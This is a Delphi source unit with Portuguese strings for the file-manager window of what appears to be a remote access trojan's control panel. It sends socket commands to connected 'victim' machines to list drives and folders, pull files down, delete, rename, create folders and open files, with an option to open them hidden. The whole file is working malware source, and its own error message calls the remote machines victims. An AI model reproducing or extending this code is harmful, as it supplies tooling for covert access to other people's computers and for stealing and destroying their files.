unit UFM;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ImgList, ExtCtrls, Menus, ScktComp;

type
  TFrmExplorer = class(TForm)
    lvexplorer: TListView;
    ilicones: TImageList;
    pb: TProgressBar;
    pm: TPopupMenu;
    Mni0Icones: TMenuItem;
    Mni2Lista: TMenuItem;
    Mni3Detalhes: TMenuItem;
    Mni1Lado: TMenuItem;
    mnimodoex: TMenuItem;
    N1: TMenuItem;
    mniatt: TMenuItem;
    mniobter: TMenuItem;
    mnideletar: TMenuItem;
    MniOpen: TMenuItem;
    MniOpenHide: TMenuItem;
    mnirenomear: TMenuItem;
    mninovo: TMenuItem;
    mnipasta: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    N4: TMenuItem;
    cbbunt: TComboBoxEx;
    pnl: TPanel;
    procedure lvexplorerDblClick(Sender: TObject);
    procedure cbbuntChange(Sender: TObject);
    procedure Mni0IconesClick(Sender: TObject);
    procedure mniattClick(Sender: TObject);
    procedure mniobterClick(Sender: TObject);
    procedure mnideletarClick(Sender: TObject);
    procedure MniOpenClick(Sender: TObject);
    procedure mnirenomearClick(Sender: TObject);
    procedure mnipastaClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormActivate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    Salvar: string;
  end;

const
  GET_FILE  = 1; // Pegar Arquivo
  LST_FILE  = 3; // Listar Arquivos
  GET_DRIV  = 4; // Pegar Drives
  DEL_FILE  = 5; // Deletar Arquivo
  REN_FILE  = 6; // Renomear Arquivo
  OPE_FILE  = 7; // Abrir Arquivo
  CRE_DIRE  = 8; // Criar Diretório

var
  FrmExplorer : TFrmExplorer;

implementation

uses UID;

{$R *.dfm}

procedure SendCommand(Ltv: TListView; Sckt: TServerSocket; Command: Integer; Param: string = '');
begin
  if (Ltv.Selected = nil) then
  begin
    MessageBox(Application.Handle, 'Primeiro Conecte-se a Uma Vitima'
    + #13 + 'Verifique Suas Conexões!', 'Erro', MB_OK
    + MB_DEFBUTTON1 + MB_ICONERROR);
    Exit;
   end else
    Sckt.Socket.Connections[Ltv.ItemIndex].SendText('Rk06:' + IntToStr(Command) + Param);
end;

procedure TFrmExplorer.lvexplorerDblClick(Sender: TObject);
begin
  if (lvexplorer.Selected.ImageIndex = 0) then
  begin
    if lvexplorer.Selected.Caption = '..' then
      cbbunt.Text := ExtractFilePath(Copy(cbbunt.Text, 1, Length(cbbunt.Text) - 1))
    else
      cbbunt.Text := Copy(cbbunt.Text, 1, LastDelimiter('\', cbbunt.Text)) + lvexplorer.Selected.Caption + '\';
  end else
    SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, OPE_FILE,
    Copy(cbbunt.Text, 1, LastDelimiter('\', cbbunt.Text)) + lvexplorer.Selected.Caption);
end;

procedure TFrmExplorer.cbbuntChange(Sender: TObject);
begin
  lvexplorer.Columns[0].AutoSize := True;
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, LST_FILE, cbbunt.Text);
end;

procedure TFrmExplorer.Mni0IconesClick(Sender: TObject);
begin
  lvexplorer.ViewStyle := TViewStyle(StrToInt(Copy(TMenuItem(Sender).Name, 4, 1)));
end;

procedure TFrmExplorer.mniattClick(Sender: TObject);
begin
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, LST_FILE, cbbunt.Text);
end;

procedure TFrmExplorer.mniobterClick(Sender: TObject);
begin
  if (lvexplorer.Selected.ImageIndex = 0) then
  begin
    MessageBox(Handle, 'Não é Possível Transferir Pastas!', 'Erro',
    MB_OK + MB_DEFBUTTON1 + MB_ICONERROR);
    Exit;
  end;
  if not DirectoryExists(GetCurrentDir + '\Downloads') then
    CreateDir(GetCurrentDir + '\Downloads');
  Salvar := GetCurrentDir + '\Downloads\' + lvexplorer.Selected.Caption;
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, GET_FILE, cbbunt.Text + lvexplorer.Selected.Caption);
end;

procedure TFrmExplorer.mnideletarClick(Sender: TObject);
begin
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, DEL_FILE, cbbunt.Text + lvexplorer.Selected.Caption);
  Sleep(100);
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, LST_FILE, cbbunt.Text);
end;

procedure TFrmExplorer.MniOpenClick(Sender: TObject);
begin
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, OPE_FILE,
  cbbunt.Text + lvexplorer.Selected.Caption + IntToStr(TMenuItem(Sender).Tag));
end;

procedure TFrmExplorer.mnirenomearClick(Sender: TObject);
begin
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt,
  REN_FILE, cbbunt.Text + lvexplorer.Selected.Caption + '|'
  + cbbunt.Text + InputBox('Digite o novo nome:', 'Digite o novo nome:', lvexplorer.Selected.Caption));
  Sleep(100);
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, LST_FILE, cbbunt.Text);
end;

procedure TFrmExplorer.mnipastaClick(Sender: TObject);
begin
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, CRE_DIRE,
  cbbunt.Text + InputBox('Nome da Pasta', 'Digite o Nome da Pasta:', ''));
  Sleep(100);
  SendCommand(Frm33585IDPrincipal.LtvServidores, Frm33585IDPrincipal.SrvrSckt, LST_FILE, cbbunt.Text);
end;

procedure TFrmExplorer.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  cbbunt.Clear;
  lvexplorer.Clear;
  Frm33585IDPrincipal.TmrModal.Enabled := False;
  EnableWindow(Frm33585IDPrincipal.Handle, True);
end;

procedure TFrmExplorer.FormActivate(Sender: TObject);
begin
  FrmExplorer.Caption := 'File Manager Explorer - '+
  Frm33585IDPrincipal.ltvservidores.Selected.SubItems.Strings[1];
end;

end.
